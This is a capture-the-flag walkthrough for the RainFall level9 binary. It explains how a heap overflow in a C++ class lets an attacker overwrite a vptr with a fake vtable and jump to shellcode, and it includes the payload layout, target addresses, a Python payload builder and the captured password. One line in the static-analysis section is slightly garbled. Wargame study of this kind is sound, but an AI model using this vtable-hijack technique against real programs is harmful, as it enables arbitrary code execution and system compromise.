## Phase 1: Reconnaissance

We find a binary named `level9` in the home directory

It exits with status 1 without an argument. A sufficiently long argument corrupts the heap and causes a crash:

```console
level9@RainFall:~$ ./level9
level9@RainFall:~$ echo $?
1

level9@RainFall:~$ ./level9 "$(python -c 'print "A" * 110')"
Segmentation fault (core dumped)
```

The symbols listed by GDB are C++ names belonging to a class named `N`, including its constructor, `setAnnotation()`, `operator+()`, and `operator-()`

Unlike the previous stack overflows, the vulnerable data in this level belongs to objects created with `new`. `new` asks the memory allocator for a block in the process's heap and returns its address. These objects therefore live on the heap, making this a heap overflow

---

## Phase 2: Static Analysis

The decompiled program is equivalent to:

```cpp
class N
{
    char annotation[100];
    int value;

public:
    N(int number) : value(number) {}

    void setAnnotation(char *text)
    {
        memcpy(annotation, text, strlen(text));
    }

    virtual int operator+(N &other)
    {
        return value + other.value;
    }

    virtual int operator-(N &other)
    {
        return value - other.value;
    }
};

int main(int argc, char **argv)
{
    if (argc <= 1)
        _exit(1);

    N *first = new N(5);
    N *second = new N(6);

    first->setAnnotation(argv[1]);
    return *second + *first;
}
```

### Explaining the `main()`

The important lines perform four operations:

1. `new N(5)` allocates the first `N` object on the heap and sets its `value` to 5
2. `new N(`6)` allocates  second object immediately afterward and"`ts its `value` to 6
3. `first->setAnnotation(argv[1])` copies `argv[1]` into the first object's `annotation` array
4. `*second + *first` means `"second.value + first.value"`


### What the Object Contains

An object is a block of memory containing its fields. Because this class also has virtual methods, the compiler adds a hidden field called the virtual-table pointer, or `vptr`, at the beginning of every object

The `vptr` points to a table of function addresses called the virtual table, or `vtable`. The program uses that table to decide which virtual method to call at runtime

The 32-bit object layout is:

```text
object offset   size    field
-------------   ----    ---------------------
0               4       virtual-table pointer
4               100     annotation
104             4       value
                        -----
                        108 bytes total
```

The `vptr` is not visible in the C++ source, but it still occupies the first 4 bytes in memory

`setAnnotation()` copies exactly `strlen(argv[1])` bytes into the 100 byte `annotation` array and never checks if everything fits inside.

So once the input overflows `annotation`, `memcpy()` continues writing into the second object

---

## Phase 3: Understanding the Virtual Call

When the program runs:

```cpp
*second + *first
```

it needs to call `N::operator+()` on the `second` object

Because `operator+()` is declared `virtual`, its address is not stored directly in the program’s call instruction. C++ finds it through two hidden pieces:

- `vptr`: a pointer stored at the beginning of the object
- `vtable`: a table containing the addresses of the class’s virtual functions


> The vptr does not point directly to operator+()  
> The vptr points to a table that contains the address of operator+()


### Normal Execution

For the `second` object, the addresses are:

```text
second object:       0x0804a078
real vtable:         0x08048848
N::operator+():      0x0804873a
```

Memory contains the following chain:

```text
0x0804a078 contains 0x08048848
0x08048848 contains 0x0804873a
```

The program therefore follows two pointers:

```text
second object
    |
    | vptr
    v
real vtable
    |
    | first function address
    v
N::operator+()
```

Using the actual addresses:

```text
0x0804a078 -> 0x08048848 -> 0x0804873a
 second         vtable       operator+()
```

The corresponding assembly is:

```text
mov eax, [second]  ; read the vptr from second
mov edx, [eax]     ; read the first function address from the vtable
call edx           ; call that function
```


### Why We Need a Fake Vtable

We want the final call to execute our shellcode instead of `operator+()`

However, we cannot simply put the shellcode address directly into `second->vptr`

If we did this:

```text
second->vptr = shellcode address
```

the program would treat the shellcode as a table. It would read the first four shellcode bytes and interpret them as another address, most likely causing a crash.

The process MUST remain divided into two steps:

```text
second -> table -> code
```

Therefore, we create a small fake vtable in memory:

```text
0x0804a00c contains 0x0804a010
0x0804a010 contains the shellcode
```

We then overwrite `second->vptr` with `0x0804a00c`

The new call chain becomes:

```text
second object
    |
    | overwritten vptr
    v
fake vtable at 0x0804a00c
    |
    | first entry contains 0x0804a010
    v
shellcode at 0x0804a010
```

Using only the addresses:

```text
0x0804a078 -> 0x0804a00c -> 0x0804a010
 second       fake vtable     shellcode
```

So the exploit changes this:

```text
second -> real vtable -> operator+()
```

into this:

```text
second -> fake vtable -> shellcode
```

> The fake vtable only needs one entry because the program only reads the first field


---

## Phase 4: Building a Fake Virtual Table

We already control the contents of the first annotation through `argv[1]`, so we use that memory for two purposes:

- its first four bytes become the only entry needed by our fake vtable
- the bytes immediately after that entry contain the shellcode

The layout is:

```text
address       contents
----------    -----------------------------------------------
0x0804a00c    0x0804a010 - fake vtable entry 0
0x0804a010    shellcode that reads /home/user/bonus0/.pass
```

Why does the shellcode begin at `0x0804a010`? The annotation begins at `0x0804a00c`, and the fake vtable entry occupies its first four bytes:

```text
0x0804a00c + 4 = 0x0804a010
```

At payload offset 108, we store `0x0804a00c`, replacing `second->vptr`

After the overflow, the arrow chain has changed:

```text
second object  ->  fake vtable in 'first->annotation'  ->  shellcode
```

The exact pointer resolution is:

```text
second->vptr = 0x0804a00c
vptr[0]      = *(0x0804a00c) = 0x0804a010
call target  = 0x0804a010
```

The fake table does not need to be a complete C++ vtable, The fake vtable only needs one entry because the program only reads its first function address



---

## Phase 5: Payload Layout

The complete payload is:

```text
input offsets   size    contents
-------------   ----    -------------------------------------
0-3             4       0x0804a010, shellcode address
4-65            62      shellcode
66-99           34      NOPs filling the rest of annotation
100-103         4       NOPs overwriting first->value
104-107         4       NOPs crossing allocator bookkeeping
108-111         4       0x0804a00c, fake vtable address
```

The payload is 112 bytes because it must travel 108 bytes from the start of the annotation to `second->vptr`, then provide the 4 byte replacement pointer

The first four payload bytes are data, not instructions. When the virtual call treats `0x0804a00c` as a vtable, it reads those bytes as the address `0x0804a010`. Execution begins at the shellcode after them

The three NOP regions total 42 bytes. Here, these NOP bytes simply fill the remaining distance up to offset 108 so that the final address lands on `second->vptr`

The addresses from `resources/exploit.py`:

```python
shellcode_address = "\x10\xa0\x04\x08"
fake_vtable_address = "\x0c\xa0\x04\x08"

payload = shellcode_address + shellcode + ("\x90" * 42) + fake_vtable_address
```

---

## Phase 6: Exploitation

We generate the argument and execute the binary:

```console
level9@RainFall:~$ ./level9 "$(python resources/exploit.py)"
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

1 - The command substitution runs the Python script and uses its raw output as `argv[1]`  
2 - `setAnnotation()` copies the payload into the first object and overwrites the second object's `vptr`  
3 - The final `*second + *first` expression then follows our fake vtable, jumps to the shellcode, and prints the password for bonus0  
